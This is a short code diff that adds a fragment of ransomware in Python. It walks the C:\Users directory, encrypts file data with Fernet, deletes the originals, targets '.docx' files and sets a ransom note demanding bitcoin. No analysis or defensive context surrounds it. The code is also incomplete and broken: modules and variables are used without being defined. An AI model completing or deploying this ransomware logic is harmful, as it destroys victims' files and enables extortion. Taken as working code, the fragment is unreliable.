@@ -1,0 +1,7 @@
+from cryptography.fernet import Fernet
+for r, d, f in os.walk("C:\\Users"):
+    x = Fernet(k).encrypt(data)
+    os.remove(path)
+    ext = ".docx"
+note = "Your files have been encrypted, send bitcoin"
+
